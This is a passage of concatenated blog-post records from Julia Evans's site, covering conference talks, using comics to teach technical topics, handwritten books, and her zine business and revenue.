that you’re smart and your work is difficult) \n\n Interpretable machine learning & human-machine interaction (by  Been Kim ) \n\n OMG. I’m trying really hard to make machine learning results more interpretable & debuggable at work (because people need to use the outputs of it!), and when she was like “that’s my research” I really wanted to be best friends. \n\n She showed  this YouTube video  of a system that automatically clusters students’ assignments and then shows you the ‘prototype’ assignments representing each segment! This seems really cool to me – if I were a teacher and had a system like this that worked well, I could imagine using this to get a sense for what kinds of solutions my students were using, and possibly even as an aid to grading. \n\n She was also super pragmatic about her research! The metric she used to decide whether the interactive system was helpful or not was – did it cause the human to perform better on the classification task they were working on? All I want is to help humans do better work & save them time so this made me super happy. I think there’s a lot of room in ML to enable people and not just replace them. \n\n Corinna Cortes \n\n omg. She’s the head of Google Research NY. omg. She talked about how her team scrapes the web and tries to discover facts (like Barack Obama is married to Michelle Obama). This was an incredibly refreshing talk for me because instead of saying “well at Google we do magic”, the impression I got was “dude this stuff is really hard and involves a lot of really boring HTML and tables”. BUT IN THE END WE WON. \n\n She talked about using interpretable models and how they manually look at examples where their algorithm isn’t performing well to decide where to focus their efforts. I asked her at the end how important good ML debugging tools were and she was like SO IMPORTANT IF YOU’RE NOT LOOKING AT YOUR DATA WHAT ARE YOU EVEN DOING. So now I’m even more motivated to build the random forest debugging tool I’ve been prototyping on the side. \n\n I’ve been doing machine learning for ~3 years now and I still find it so hard, so it’s amazing to hear from someone’s an expert and talks honestly about how time-intensive building a good model is. I get really mad when people pretend that ML is easy or that if you’re smart you can just get good results like magic. </rant> :) \n\n (sometimes ML really does work that way and the results are magical! those are the most fun days) \n\n"},
{"url": "https://jvns.ca/blog/2016/12/23/systems-we-love/", "title": "Systems We Love 2016", "content": "\n      A couple weeks ago I went to Systems we Love!\nThere’s a list of  all the talks here . A few of my favorites: (they’re all 20 minutes) \n\n A Race Detector Unfurled  by\nKavya Joshi was definitely my favorite talk of the conference. She\nexplains how the Go race detector works super super clearly. I didn’t\nknow anything about the topic, and now I do! \n\n 7074 says Hello World by Marianne Bellotti was another of my favorites.\nI think sadly it wasn’t recorded, but it talked about where mainframes\nfit in in the US government’s technology, and about what it’s like to\nhave to integrate with them. \n\n I liked  Less Ado about NTP , mostly because it laid out really\nclearly the  assumptions  about the NTP system, specifically that the\nlatency from computer A to computer B is the same as the latency from\ncomputer B to computer A. It made me want to learn more about NTP! \n\n DNS and the Art of Making Systems “Just Complex Enough”  by Alex Wilson is an\ninteresting discussion about the design of DNS. It talks about how the DNS\nspec goes out of its way to say “hey, if you don’t understand a record,\nyou have to pass it on verbatim”. This is a great example of a design\ndecision that helps you upgrade a protocol gradually over time! \n\n An AWK Love Story  is also\nsuper good. I’ve been confused by awk for a long time and this helped me\nunderstand a little better how it’s used. \n\n"},
{"url": "https://jvns.ca/blog/2017/01/17/an-idea-for-a-programming-book/", "title": "An idea for a programming book", "content": "\n      I’ve been toying with the idea of writing a programming book for a\nwhile. I even  compiled a list of tweets by people saying “hey you should write a book” \nin case I wanted encouragement. \n\n This post is not “I am writing a book”, but I had an idea and I kind of\nliked it so I thought I would write it down. \n\n I have a few conflicting things: \n\n \n I like writing these drawings I’ve been doing about programming ( http://drawings.jvns.ca/ ) \n I don’t want to write a comic book, exactly. \n Writing a book which explains a big complicated concept (“here is all\nof networking explained”) is really hard – like I’m writing a\nnetworking zine right now, and I’m very excited about it, but it’s\nalso really hard to make all the ideas fit together. \n \n\n So! the idea! \n\n Each pair of pages is devoted to an idea (“OMG ASSEMBLY”).\nOn one side, there’s a comic, like this: \n\n \n\n and on the other side of the page there are a few words about why the\nthing is cool and ways you could learn more (“omg omg did you know you\ncan use a DISASSEMBLER and that there is this great BOOK about\nassembly”). Someone on twitter described the role of this as\n“ signposting ”,\nlike “here is the way to more delightful things about this topic!” \n\n It would be less of “this is a textbook you use to learn everything\nabout Linux” and more of “this is a book you can open to be inspired and\ndelighted and find a new interesting thing to learn about”. So more like\n“thing explainer” than “why’s poignant guide to ruby”. \n\n It might be mostly about Linux? like “julia’s magical things about Linux”. \n\n Anyway! I don’t know if I will do this at all (like, I have a full time\njob which I generally like doing, and a bunch of Things to Do), so this\nmore of an “idea julia is having at 1am” than a promise :). \n\n So I don’t forget, here is  a twitter thread about technical comic books that gave me a bunch of ideas. . \n\n"},
{"url": "https://jvns.ca/blog/2016/11/14/why-cute-drawings/", "title": "Why cute drawings?", "content": "\n      Every day in November, I’ve been making small drawings about Linux. You\ncan find them all at  https://drawings.jvns.ca . \n\n Someone commented today on a tech news site: \n\n \n I don’t understand why these, frankly, childish drawings of things you\ncan learn from reading a wikipedia article have reached this level of\npopularity. \n \n\n this comment was a bit inflammatory, but I think it’s actually an\ninteresting question: why  are  these pretty simple drawings so popular? \n\n Here’s a reply: \n\n I’d be the first to point out that I’m  not a particularly talented artist . So why do I spend my time drawing comics, when I’m not even that\ngood at drawing? \n\n it’s because I’ve found they’re, in some situations, such a great way to\ncommunicate that I feel silly not taking advantage of it\nA few reasons: \n\n \n Comics are great for summarizing. I wrote a  blog post at work \nabout\nhow we do service discovery. I started out with just writing 1200\nwords, and trying to be as informative as possible. I thought it was\npretty good. But then I drew a comic summarizing a main ideas! A\nreally common reaction was “wow, the blog post took me 15 minutes to\nunderstand, but after reading the comic I understood the main ideas in\n30 seconds”. This is awesome because somebody can see the main ideas\nand decide whether they want to continue reading. \n\n I can trick people into reading about useful concepts that they might\notherwise think are too hard or not useful or not fun. I wrote a zine\ncalled “linux debugging tools you’ll love” ( here ). This zine discusses\na lot of tools which are traditionally considered a little bit\nadvanced. Because of that, a lot of people don’t even know those tools exist,\nor might not consider trying them! All kinds of people have told me\n“julia, i read your zine, and the next day I used a tool in it to fix\na bug at work”. \n\n They’re an awesome way to introduce people to new ideas. Anyone can\nlearn about /proc! It is not that complicated. But a lot of people\ndon’t even know /proc is interesting.  This drawing about /proc \ntook me\nmaybe 15 minutes to draw. I posted it on twitter and it got 180,000\nimpressions. A lot of people replied to me “wow, that’s so useful, I\ndidn’t even know that that existed, I’m going to go learn more about\nthat now!!”. They will probably learn more about it by reading the man\npage or Wikipedia or some more traditional means. But they learned\nabout it from a small drawing :) \n \n\n I started drawing things because my wrists hurt a lot and I was too\nstressed out about it to use my computer after work. \n\n But these days I draw things because I love telling people things about computers\nthat help them (“omg julia, i had no idea about this, this, this is so\nuseful”), and simple drawings turn out to be a pretty effective way to do\nthat. I don’t do it because I’m a visual thinker or because I’m a good\nartist or because I think comics are always the best way to learn. I\njust do it because it works, and it’s fun. \n\n Let’s keep experimenting with different ways to talk about\ntechnology to each other! Lin Clark has a site\n Code Cartoons  mostly about web development and it is great. \n\n"},
{"url": "https://jvns.ca/blog/2017/05/14/handwritten-books/", "title": "Handwritten books", "content": "\n     \n\n I asked yesterday on Twitter if it was too weird to write a book that’s totally\nhandwritten. A few people gave me really great examples of prior art, and I\nwanted to record them here so I don’t forget. \n\n One thing a lot of these have in common is – they use visual elements that\naren’t just writing (comics, people, circuit diagrams, mathematical diagrams,\nillustrations of mountains, trees, weird colours). \n\n One of my favorite things about writing by hand is exactly this – if you want\nto include a diagram, you can just do it instantly!! You don’t need to fight\nwith your typesetting system for days. \n\n Here are the examples I found. There’s a pretty wide range and I think they’re\nall really wonderful. Some of them are about math/computing/electronics, some\naren’t. \n\n Understanding Comics \n\n Scott McCloud’s  Understanding Comics \nis a wonderful book about comics, it’s written as a comic book. I’d\nreally recommend reading it if you’re interested in comics at all. \n\n This page (on closure) was one of my favorite parts. ( image source ) \n\n \n \n \n\n Getting Started in Electronics \n\n Forrest M. Mims III’s  Getting Started In Electronics , which has helped a lot of\n people learn electronics. See also  Circuit Classics . \n\n Here’s an example of what it looks like.\nImage source:  this hackaday post \n\n \n \n \n\n A Lazy Logician’s Guide To Linear Logic \n\n Jennifer Davoren’s\n A Lazy Logician’s Guide to Linear Logic (pdf) \nwhich looks delightful. Thanks to Chris Martens for this one. \n\n \n \n \n\n The Moosewood Cookbook \n\n Mollie Katzen’s  The Moosewood\n Cookbook \nis handwritten! The recipes all look really lovely. \n\n ( image source ) \n\n \n \n \n\n I haven’t read it but if you google  moosewood cookbook\nhandwriting \nyou can see some more of the insides. \n\n Dikjstra’s EWD manuscripts \n\n I learned today from Lindsey Kuper about Dijkstra’s “EWD” manuscripts (you\ncan find all of them at  http://www.cs.utexas.edu/~EWD/) . There are over a\nthousand of them. \n\n Here’s a description of the body of work: \n\n \n Like most of us, Dijkstra always believed it a scientist’s duty to\nmaintain a lively correspondence with his scientific colleagues. To a greater\nextent than most of us, he put that conviction into practice. For over four\ndecades, he mailed copies of his consecutively numbered technical notes, trip\nreports, insightful observations, and pungent commentaries, known\ncollectively as “EWD”s, to several dozen recipients in academia\nand industry. Thanks to the ubiquity of the photocopier and the wide interest\nin Dijkstra’s writings, the informal circulation of many of the EWDs\neventually reached into the thousands. \n \n\n In  this one , he talks\nabout his thoughts on the EWD series after 28 years, I think it’s really worth\na read. \n\n \n \n \n\n Yuma Sakugawa’s “a little book of life hacks” \n\n Yumi Sakugawa  The Little Book of Life\nHacks  is\na self-help book \n\n image source: an interview with yumi sakugawa \n \n \n \n\n Pictorial Guide to the Lakeland Fells \n\n Alfred Wainwright’s  Pictorial Guide to the Lakeland Fells \n\n From the Wikipedia article: \n\n \n A Pictorial Guide to the Lakeland Fells is a series of seven books by A.\nWainwright, detailing the fells (the local word for hills and mountains) of\nthe Lake District in northwest England. Written over a period of 13 years\nfrom 1952, they consist entirely of reproductions of Wainwright’s manuscript,\nhand-produced in pen and ink with no typeset material. \n\n The series has been in print almost continuously since it was first published\nbetween 1955 and 1966, with more than 2 million copies sold. It is still\nregarded by many walkers as the definitive guide to the Lakeland\nmountains. The 214 fells described in the seven volumes have become known as\nthe Wainwrights. As of 2013 the LDWA register of those who have climbed all\nthe fells listed 674 names. The Wainwright Society maintains a “register\nof current Society members who have climbed all 214 fells” \n \n\n \n \n \n\n Illustrating BBC Basic \n\n Donald G. Alcock’s  Illustrating BBC\nBasic \nfrom the 80s is a book about BASIC! \n\n (image from scribd)\n \n \n \n\n Funny Little Calculus Text \n\n Robert Ghrist  Funny Little Calculus Text (pdf) \nis hilarious and amazing. Here’s 2 screenshots so you can understand: \n\n \n \n \n\n \n \n \n\n and more \n\n \n Fortran coloring book ,  amazon link \n \n\n with some good quotes: \n\n \n “The right way to read a FORTRAN book,” the author of this one tells\nus now that we’ve read his almost to its last page, “is by a series of\nskimming passes. Each time through you pick up a bit more of the\nnitty-gritty detail. When you pick up an IBM manual, for instance,\nfirst flip through it looking for the jokes. There aren’t any, so go\nback and flip through again, getting familiar with the overall idea.\nThen flip through from back to front, side to side, and top to bottom.\nIf there’s a centerfold, you’re in the wrong publication! Each time\nthrough, you’ll be looking for specific details connected with\nwhatever you are doing at the time on the computer. “ \n \n\n and \n\n \n Dr. Kaufman wrote the book. I mean, he wrote it, the actual words you\nsee, with a pen. He also drew the pictures, diagrams, flow charts, and\nthings. \n \n\n \n Cook Korean \n Make Your Place: Affordable, Sustainable Nesting Skills \n Codex Seraphinianus \n Book of Pages \n The Book of Letters \n The Story of “S”  (a book format I have never seen before!) \n why’s poignant guide to ruby  (not\nhandwritten, but certainly worth a mention) \n grokking algorithms  is also illustrated but not handwritten. \n \n\n"},
{"url": "https://jvns.ca/teach-tech-with-cartoons/", "title": "How to teach technical concepts with cartoons", "content": "\n     \n\n \n.small {\n    width: 400px\n}\n@media only screen and (max-width: 500px) {\n    width: 100%\n}\n \n\n People sometimes tell me these days “wow julia, you are so good at drawing, it is so cool!” \n\n I think this is kind of funny because, this is what happens when I try to draw animals. \n\n \n \n \n \n \n\n But! There actually  is  a skill to explaining technical concepts to people with drawings. And I\nthink I’ve become pretty good at that skill! It is just a different skill than like “drawing an\nelephant that looks like an elephant” \n\n This post is about a few patterns I use when illustrating ideas about computers. If you are\ninterested in using drawings to teach people about your very favorite computer topics, hopefully\nthis will help you! \n\n Let’s talk about how to structure cartoons and how to translate computer concepts into pictures! \n\n cartooning isn’t about drawing skills \n\n Just to emphasize it again – this is basically the entire visual vocabulary I use. \n\n \n \n \n \n \n\n I think of tech cartooning as being about cartooning skills! I need to be good at: \n\n \n using a very small number of words to express an idea (for example  this mutexes cartoon  has maybe 60 words in it) \n breaking something down into simple concepts (“what are the key ideas you need to understand DNS?”) \n staging relevant scenarios (“what’s a good example to use to show how a mutex works?”) \n \n\n Here are some tactics I like to use when drawing! \n\n personify the characters \n\n I do a lot of personification/anthropomorphization – I’ll take a system and turn it into a cast of\ncharacters who talk to each other. For example, here’s a scene from Kubernetes: the kubelet\ncomponent is talking to the API server \n\n \n \n \n \n \n\n This is useful because \n\n \n it emphasizes that the “kubelet” and the “api server” (whatever those are) are important concepts\nin Kubernetes \n it shows you that those two components communicate with each other \n it’s more fun than reading a paragraph saying the same thing \n \n\n Here’s part of the cast of characters from my networking zine: (a laptop! a router! an operating\nsystem! a program!) \n\n \n \n \n \n \n\n Taking a complicated computer system and breaking down “ok, these are 3 main important characters in\nthis system” is incredibly useful. \n\n show a scene \n\n The next step after just making your characters is to put them into scenes and make them interact\nwith each other! So once you’ve established “the important characters here are the laptop, the DNS\nserver, and the HTTP server”, you can show how they actually work together in real life. \n\n Here’s a scene with two humans talking: \n\n \n \n \n \n \n\n and one with two programs who are both using the same mutex: \n\n \n \n \n \n \n\n I think this scene (with program 2 thinking “not my turn yet”) is a pretty clear way to explain what\nhappens when a mutex is in use, and I think it’s faster to understand what’s going on than if you\nread a paragraph explaining the same thing. \n\n make a list \n\n I make a LOT of lists (for example, this post itself is a “list of things I’ve learned about making comics\n:)“). A few examples: \n\n Here’s part of a list of networking tools and what they’re for \n\n \n \n \n \n \n\n a list of attributes of a Unix process \n\n \n \n \n \n \n\n and a list of strategies for asking good questions \n\n \n \n \n \n \n\n A few things I love about making lists: \n\n \n you can make a list of steps (step 1! step 2! step 3!) \n it’s a really clear structure and so they’re easy to understand \n it’s a nice way to teach someone something new (maybe you list 10 interesting things, and they\nonly knew about 7 of them!) \n none of them claim to be exhaustive (I didn’t say those were  all  the attributes of a process!) \n sometimes I learn surprising things while making them. For example I started listing Linux\nnetworking tools and I was really surprised by how  many  of them there were (I ended up listing\n24 of them!) ( here’s the whole list ) \n \n\n make a diagram \n\n A big part of the joy of hand drawing comics is that I can really easy make diagrams to explain what\nI mean! No fiddling with LaTeX or graphviz or anything. \n\n Here’s part of a diagram I made to illustrate memory fragmentation: \n\n \n \n \n \n \n\n and a slightly more involved diagram showing the structure of a UDP packet: \n\n \n \n \n \n \n\n I love that I can use arrows / colours to emphasize things I think are important or give extra\ninformation. Like in this UDP packet diagram I greyed out fields that I thought were less important\n(like the “fragment offset”, which is definitely less important to understand than the source IP\naddress). \n\n make a joke \n\n Computers are often really confusing and surprising. This can be kind of frustrating (“what is my\nprogram even doing?!!?!“) and also kind of funny! I think all the weird stuff that happens is part of\nthe joy of computers! So sometimes I try to make jokes. \n\n Here’s the Kubernetes scheduler all worried because it noticed a pod that it hasn’t been scheduled.\n(scheduler: “OH NO! I was supposed to have done that already! julia will be mad!”) \n\n \n \n \n \n \n\n and a silly “C is for linearizable” joke (because the C in “CAP theorem” stand for “consistent”. But\n“consistent” is a pretty unclear term, so it’s more precise to say that it sounds for linearizable.\nSo confusing!“) \n\n \n \n \n \n \n\n just write some text \n\n I like using cartoons but sometimes I’ll just write a paragraph.  Here’s the start of a page about\ndstat: \n\n \n \n \n \n \n\n This basically just says “every second, dstat prints out how much network & disk your computer used\nthat second”. I could have typed that! But I think writing it by hand emphasizes like “no, this is\nsomething I really love, I love it so much  I wrote it out by hand and made a picture to show you!” \n\n paste some computer output \n\n Sometimes I want to paste and discuss some output you might see on a computer.  For example, when I\nmade my strace zine I realized that a lot of strace output is really confusing. I wanted to paste\nsome actual strace output to talk about! \n\n Luckily that is really easy to do in a drawing, because you can just put anything you want in it! \n\n \n \n \n \n \n\n trace icons/logos \n\n At the beginning I said “I can’t draw well”, which is true! But I  can  trace things. It’s a fun\nway to make up for my lack of drawing skills. \n\n It’s useful sometimes to include logos / icons! For example here are versions I traced of the\nKubernetes logo, the Recurse Center logo, Tux (the linux penguin), and a cat. The cat isn’t\nanybody’s logo as far as I know. \n\n \n \n \n \n \n\n The hand-traced versions of these logos are kind of wobbly and imprecise in a way that is pretty\nsatisfying to me, I think they look cool. \n\n designing your comics \n\n You have a blank sheet of paper in front you, and some information you want to convey! How do you do\nit? Having a few structure patterns really helps. Here are some examples: \n\n Here’s one way of making a list: \n\n \n \n \n \n \n\n A list of many small things: \n\n \n \n \n \n \n\n and yet another list, here a list of steps. This one is organized into numbered panels! \n\n \n \n \n \n \n\n This one is more of a normal comic and less of a list – it’s visually laid out with\nsquares/rectangles like a comic, and tells a bit of a story. \n\n \n \n \n \n \n\n And finally this one is pretty unstructured. Personally I find this one a bit hard to to\nread/follow, I think having more structure than this is easier. \n\n \n \n \n \n \n\n I think  panels  are a popular way of structuring comics for a reason, they help split up your\ndrawing and make it clear what order the comic should be read in. \n\n just making something a cartoon doesn’t necessarily mean it teaches what people need to know \n\n I’m going to pick on another cartoon a bit here which I don’t really like to do but I need an\nexample :). \n\n There’s an extremely adorable guide to Kubernetes called  The Children’s Illustrated Guide to Kubernetes . \n\n I think this cartoon is cool and introduces a lot of important ideas. But for me personally I\ncouldn’t understand how Kubernetes worked at all until I understood the role of etcd in Kubernetes\n(all the Kubernetes state is stored in etcd and every other Kubernetes component is stateless). And\nthis cartoon doesn’t mention etcd even once! So I don’t think this cartoon would really have helped\nme understand Kubernetes. \n\n I think there are kind of 2 ways to use drawings to teach: \n\n \n draw diagrams / cartoons that make what you’re teaching more  clear \n use drawings to make what you’re teaching more  fun \n \n\n Making concepts more clear and more fun are both great goals! Making things fun can be a good way to\nmake people pay attention and make hard concepts seem less intimidating! \n\n But when I’m working on illustrations I find it useful to think about whether my drawings are\nactually helping explain the concept or whether they’re just fun (like drawing a picture of a shark\nwhen talking about Wireshark!). \n\n In this children’s illustrated guide to kubernetes, I think the drawings mostly serve to make the\ncontent seem more  fun  – almost all the actual content is in the text. I think if you removed\nall the giraffe drawings the document would contain basically the same information! This is not a\nbad thing necessarily but I usually like to have more informational content in my drawings. \n\n tools that make it easy \n\n The tools I use today to make these are (see  this interview for more ) \n\n \n a Samsung Chromebook Plus (though any samsung tablet with an S-pen will work. Or an ipad with the\napple pencil!) \n the Squid app for Android (goodnotes for ipad is good too!) \n that’s it! \n \n\n Having a tablet I can draw on means I can really quickly draw something, click “share on Twitter”\nand immediately show it to the world. I definitely produce way more drawings with it than I did when\nI was working with pen and paper. And they look way better :) \n\n drawings don’t have to be beautiful to be awesome \n\n I started out by drawing things on paper with a pen / Sharpie and just taking pictures. They all\nlooked way less good than everything I’ve posted above, but they were still really cool!! \n\n For example here’s a very early drawing that I drew in pen on paper and posted to Twitter. Today I\nfind this kind of janky & illegible but honestly when I posted it I got TONS of positive comments\n( evidence ).\n \n \n \n \n \n\n So drawings do not have to be beautiful and clean! They can be a sketchy thing you wrote on paper\nand that is okay. \n\n how do you decide what’s a good subject for a tech cartoon? \n\n Let’s take this comic on floating point I made last year! For that one, the steps were: \n\n \n Remember that I was really confused about floating key point until I learned a few key insights\nfrom Stefan Karpinksi. When I learned these things my mind was totally blown and it was so\nexciting!!!\n\n \n a double is 64 bits. That means there are only 2^64 floating point numbers!!! \n The smallest double after 2^52 is 2^52 + 1 (so 2^52 + 0.2 = 2^52). \n This means you can’t have integers above 2^53 in Javascript \n \n Think “well, those three things are really simple, I could put them in a comic” \n Figure out how to organize them into panels of a comic!! \n Don’t draw more than one page. \n \n\n Here’s the final floating point comic I came up with in this example \n\n \n \n \n \n \n\n I organize a lot of my comics about some key insight / fact / surprising thing that it took me a\n long time to learn and was really useful to me. \n\n Another example of this is this “how Unix permissions work” comic – like if you don’t know that\n‘0644’ is a number in octal and why it maps to  rw-r--r-- , it’s hard to understand how permissions\nwork. Here’s the  comic about unix permissions . \n\n you could make tech illustrations too \n\n If you are interested in drawing tech cartoons, I hope this blog post gives you some ideas about how\nto do that!  I’ve seen a lot of people making great illustrations about tech: \n\n If you’re interested in making cartoons I’d really recommend the book  Understanding Comics , by Scott McCloud, it’s a really\nincredible explanation of how comics work. I learned a ton from reading it. \n\n A few other people who are doing great work in tech comics: \n\n \n Lin Clark  https://code-cartoons.com/  (a lot of React cartoons). She also has some awesome posts about\nFirefox internals like  Inside a super fast CSS engine: Quantum CSS (aka Stylo) \n Amy Wibowo  https://bubblesort-zines.myshopify.com  (computer science zines!). I previously wrote an\nextended  fan post about how great I think her work is . \n Mariko Kosaka  https://twitter.com/kosamari  tweets cool drawings! like  this one about HTML1.x vs 2.x \n Vaidehi Joshi has been making awesome CS comics at  https://medium.com/basecs \n \n\n"},
{"url": "https://jvns.ca/blog/2018/12/09/how-do-you-document-a-tech-project-with-comics/", "title": "How do you document a tech project with comics?", "content": "\n     \n\n Every so often I get email from people saying basically “hey julia! we have an open source project!\nwe’d like to use comics / zines / art to document our project! Can we hire you?“. \n\n spoiler: the answer is “no, you can’t hire me” – I don’t do commissions. But I do think this is a\ncool idea and I’ve often wished I had something more useful to say to people than “no”, so if you’re\ninterested in this, here are some ideas about how to accomplish it! \n\n zine != drawing \n\n First, a terminology distinction. One weird thing I’ve noticed is that people frequently refer to\nindividual tech drawings as “zines”. I think this is due to me communicating poorly somehow, but –\ndrawings are not zines! A zine is a  printed booklet , like a small maga zine . You wouldn’t call a\nphoto of a model in Vogue a magazine! The magazine has like a million pages! An individual drawing\nis a drawing/comic/graphic/whatever. Just clarifying this because I think it causes a bit of\nunnecessary confusion. \n\n comics without good information are useless \n\n Usually when folks ask me “hey, could we make a comic explaining X”, it doesn’t seem like they have\na clear idea of what information exactly they want to get across, they just have a vague idea that\nmaybe it would be cool to draw some comics. This makes sense – figuring out what information would\nbe useful to tell people is very hard!! It’s 80% of what I spend my time on when making comics. \n\n You should think about comics the same way as any kind of documentation – start with the\ninformation you want to convey, who your target audience is, and how you want to distribute it\n(twitter? on your website? in person?), and figure out how to illustrate it after :). The\ninformation is the main thing, not the art! \n\n Once you have a clear story about what you want to get across, you can start trying to think\nabout how to represent it using illustrations! \n\n focus on concepts that don’t change \n\n Drawing comics is a much bigger investment than writing documentation (it takes me like 5x longer to\nconvey the same information in a comic than in writing). So use it wisely!  Because it’s not that\neasy to edit, if you’re going to make something a comic you want to focus on concepts that are very\nunlikely to change. So talk about the core ideas in your project instead of the exact command line\narguments it takes! \n\n Here are a couple of options for how you could use comics/illustrations to document your project! \n\n option 1: a single graphic \n\n One format you might want to try is a single, small graphic explaining what your project is about\nand why folks might be interested in it. For example:  this zulip comic \n\n This is a short thing, you could post it on Twitter or print it as a pamphlet to give out. The\ninformation content here would probably be basically what’s on your project homepage, but presented in a\nmore fun/exciting way :) \n\n You can put a pretty small amount of information in a single comic. With that Zulip comic, the\nthings I picked out were: \n\n \n zulip is sort of like slack, but it has threads \n it’s easy to keep track of threads even if the conversation takes place over several days \n you can much more easily selectively catch up with Zulip \n zulip is open source \n there’s an open zulip server you can try out \n \n\n That’s not a lot of information! It’s 50 words :). So to do this effectively you need to distill\nyour project down to 50 words in a way that’s still useful. It’s not easy! \n\n option 2: many comics \n\n Another approach you can take is to make a more in depth comic / illustration, like  google’s guide to kubernetes  or  the children’s illustrated guide to kubernetes . \n\n To do this, you need a much stronger concept than “uh, I want to explain our project” – you want to\nhave a clear target audience in mind! For example, if I were drawing a set of Docker comics, I’d\nprobably focus on folks who want to use Docker in production. so I’d want to discuss: \n\n \n publishing your containers to a public/private registry \n some best practices for tagging your containers \n how to make sure your hosts don’t run out of disk space from downloading too many containers \n how to use layers to save on disk space / download less stuff \n whether it’s reasonable to run the same containers in production & in dev \n \n\n That’s totally different from the set of comics I’d write for folks who just want to use Docker to\ndevelop locally! \n\n option 3: a printed zine \n\n The main thing that differentiates this from “many comics” is that zines are printed! Because of that,\nfor this to make sense you need to have a place to give out the printed copies! Maybe you’re going\npresent your project at a major conference? Maybe you give workshops about your project and want\nto give our the zine to folks in the workshop as notes? Maybe you want to mail it to people? \n\n how to hire someone to help you \n\n There are basically 3 ways to hire someone: \n\n \n Hire someone who both understands (or can quickly learn) the technology you want to document and\ncan illustrate well. These folks are tricky to find and probably expensive (I certainly wouldn’t\ndo a project like this for less than $10,000 even if I did do commissions), just because programmers\ncan usually charge a pretty high consulting rate. I’d guess that the main failure mode here\nis that it might be impossible/very hard to find someone, and it might be expensive. \n Collaborate with an illustrator to draw it for you. The main failure mode here is that if you\ndon’t give the illustrator clear explanations of your tech to work with, you.. won’t end up with\na clear and useful explanation. From what I’ve seen,  most folks underinvest in writing clear\nexplanations for their illustrators  – I’ve seen a few really adorable tech comics that I don’t\nfind useful or clear at all. I’d love to see more people do a better job of this. What’s the\npoint of having an adorable illustration if it doesn’t teach anyone anything? :) \n Draw it yourself :). This is what I do, obviously. stick figures are okay! \n \n\n Most people seem to use method #2 – I’m not actually aware of any tech folks who have done\ncommissioned comics (though I’m sure it’s happened!). I think method #2 is a great option and I’d\nlove to see more folks do it. Paying illustrators is really fun! \n\n"},
{"url": "https://jvns.ca/blog/2019/10/01/zine-revenue-2019/", "title": "Zine revenue for 2019", "content": "\n     \n\n I occasionally get questions like “Can you share what you’ve learned about\nrunning a business?” The most surprising thing I’ve learned is that it’s\npossible to make money by teaching people computer things on the internet, so I\nwant to make that a little more concrete by sharing the revenue from the  zine\nbusiness  so far in 2019. Here’s a graph of revenue by\nmonth (the last month is September 2019): \n\n \n\n This adds up to $87,858 USD for 2019 so far, which (depending on what I release in the\nrest of this year) is on track to be similar to revenue for 2018 ($101,558). \n\n Until quite recently I’d been writing zines in my spare time, and now I’m  taking a year to focus on it . \n\n how $30,000 for September breaks down \n\n The most obvious thing in that monthly revenue graph above is that 2 months\n(September and March) have way more revenue than all the others. This is\nbecause I released new zines (Bite Size Networking and HTTP: Learn your browser’s\nlanguage) in those months. \n\n Here’s how the $30,000 for September breaks down: \n\n \n it’s 85% sales to individuals, 15%  corporate licenses \n it’s approximately:\n\n \n $18,000 the new HTTP zine \n $10,000 the various zine packs (the 6 pack and the 3 pack) \n $2,000 other individual zines \n \n \n\n This September was the month with the most sales ever, which is mostly because\nof individual humans who find the zines useful (thank you!!). \n\n expenses \n\n The main expenses are paying illustrators and an accountant, a mailing list,\nand various books I buy to learn how to do things better. They probably come\nout to about 10% of revenue or so, and then there are taxes after that. \n\n giving away free copies has been great \n\n With the HTTP zine, like many of my previous zines, I’ve been giving away one\nfree copy for every copy that people buy, so that people can get it even if $12\nis hard for them to afford. I’m pretty happy with this setup – we’ve given\naway 1358 copies so far. (I think of this as kind of a “sales” statistic too) \n\n I think I want to automate the system to give away free copies a bit more soon\n(like by automatically updating the number of free zines available using the\nGumroad API instead of periodically doing it manually). \n\n hopefully this is a useful data point! \n\n Writing about money on the internet is weird, so this will probably be the\nfirst and last zine revenue post, but I’m writing it down in the hopes that\nit’s a useful data point for others. I thought for a long time that you could\nonly really make money from writing on the internet with ads or sponsorships,\nbut it’s not true! \n\n The goal of this isn’t to say “you should run a business” or anything, just\nthat this is a thing that’s possible in the world and that many developers\ndo really value good educational materials and are happy to pay for them (if\nyou’re one of those people, thank you!) \n\n"},
{"url": "https://jvns.ca/blog/2018/09/23/why-sell-zines/", "title": "Why sell zines?", "content": "\n     \n\n Hello! As you may have noticed, I’ve been writing a few new zines (they’re all at\n https://jvns.ca/zines  ), and while my zines used to be free (or pay-for-early-access-then-free\nafter), the new ones are not free! They cost $10! \n\n In this post, I want to talk a little about why I made the switch and how it’s been going so far. \n\n selling your work is okay \n\n I wanted to start out by saying something sort of obvious – if you decide to sell your work\ninstead of giving it away for free, you don’t need to justify that (why would you?). Since I’ve\nstarted selling my zines, exactly 0 people have told me “julia, how dare you sell your work”, and a\nlot of people have said “your work is amazing and I’m happy to pay for it! This is great!” \n\n But I still want to talk about this because it’s been a pretty confusing tradeoff for me to think\nthrough (what are my goals? does giving things away for free or selling them accomplish my goals\nbetter?) \n\n what are my goals? \n\n I don’t have a super clear set of goals with my blog / zines, but here are a few: \n\n \n expose people to new important ideas that they might never have heard of otherwise. I think in\nsystems a lot of knowledge can be hard to get if you don’t know the right people, I think that’s\nvery silly, and I’d like to make a small dent in that. \n explain complicated ideas in the simplest possible way (but not simpler!!!). A lot of things that\nseem complicated at first actually aren’t really, and I want to show people that. \n \n\n free work is easier to distribute \n\n The most obvious advantage is that if something is free, it’s way easier for more people to access it and learn from it. For me, this is the biggest thing – I care about the impact of my writing\n(writing just for myself is useful, but ideally I’d like for it to help lots of people!) \n\n A really good example of this is this article  Open Access for Impact: How Michael Nielsen Reached 3.5M Readers  about Michael Nielsen’s book  Neural Networks and Deep Learning . 3.5M readers is probably an overestimate, but he says: \n\n \n total time spent by readers is about 250,000 hours, or roughly 125 full time working years. \n \n\n That’s a lot! This was the biggest reason I held off selling zines for a long time – I worried that\nif I sold my zines, not that many people would buy them relative to how many folks would download\nthe free versions. \n\n selling zines makes it easier to spend money (and time) on it \n\n A huge advantage of  selling  zines, though, is that it makes it way easier to invest in making\nsomething that’s high-quality. I’ve spent probably $5000 on tablets / printing / software /\nillustrators to make zines. Since I’ve made substantially more than $5000 at this point (!!!),\ninvesting in things like that is now a really easy decision! I can hire super talented illustrators\nand pay them a fair amount and not worry about it! \n\n I decided earlier this year to buy an iPad (which has made drawing zines SO MUCH EASIER for me, the\napple pencil is amaaazing), and instead of thinking “oh no, this is kind of expensive, should I\nreally spend money on it?” I could just reason “this is a tool that will more than pay for itself! I\nshould just buy it!“. \n\n Also, the fact that I’m making money from it makes it way easier to spend  time  on the project –\nany given zine takes me weeks of evenings/weekends to make, and carving that time out of my schedule\nisn’t always easy! If I’m getting paid for it, it’s way 